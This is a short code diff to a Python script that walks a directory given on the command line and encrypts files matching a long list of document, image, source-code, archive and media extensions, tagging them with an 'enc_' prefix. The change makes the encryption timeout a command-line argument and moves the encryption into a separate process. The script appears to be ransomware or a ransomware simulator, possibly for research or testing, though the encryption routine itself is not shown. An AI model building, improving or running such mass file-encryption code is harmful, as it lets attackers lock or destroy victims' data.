@@ -8,8 +8,9 @@ import threading
 import os
 import sys
 from os import walk
+import multiprocessing
 
-encryption_timeout = 120
+encryption_timeout = int(sys.argv[2])
 encrypted_symbol = "enc_"
 ext = ('.jpg', '.png', '.bmp', '.raw', '.c', '.java', '.class', '.cpp', '.h', '.jar', '.txt', '.doc', '.docx', '.pdf', '.ptx', '.ppt', '.rar', '.zip', '.7z', '.mp3', '.mp4', '.mpg', '.mpeg', '.avi', '.tar.gz', '.sql', '.xml', '.py', '.js', '.php', '.pps', '.cs', '.xls', '.xlsx', '.3gp', '.mov', '.mkv', '.vob', '.wps', '.odt')
 base_path = sys.argv[1]
@@ -73,7 +74,7 @@ def StartEncryption():
 
 ###################### main ######################
 
-enc_thread = threading.Thread(target=StartEncryption)
+enc_thread = multiprocessing.Process(target=StartEncryption)
 enc_thread.daemon = True
 enc_thread.start()
 enc_thread.join(encryption_timeout)
